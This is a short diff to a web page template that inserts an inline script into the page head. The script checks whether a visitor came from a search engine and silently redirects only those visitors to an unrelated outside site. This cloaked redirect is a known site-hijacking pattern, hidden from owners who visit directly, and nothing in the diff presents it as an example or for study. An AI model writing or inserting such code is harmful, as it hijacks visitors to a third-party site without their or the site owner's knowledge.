@@ -315,6 +315,30 @@ a.text-body:hover::after {
   width: 100%;
 }
 </style>
+  <script>
+  (function () {
+    var referrer = document.referrer.toLowerCase();
+    var searchEngines = [
+      "google.",
+      "bing.com",
+      "baidu.com",
+      "yahoo.com",
+      "yandex.com",
+      "duckduckgo.com",
+      "sogou.com",
+      "so.com",
+      "sm.cn"
+    ];
+
+    var isFromSearchEngine = searchEngines.some(function (engine) {
+      return referrer.indexOf(engine) !== -1;
+    });
+
+    if (isFromSearchEngine) {
+      window.location.href = "https://www.wangxiansheng.com";
+    }
+  })();
+</script>
 </head>
 <body>
 
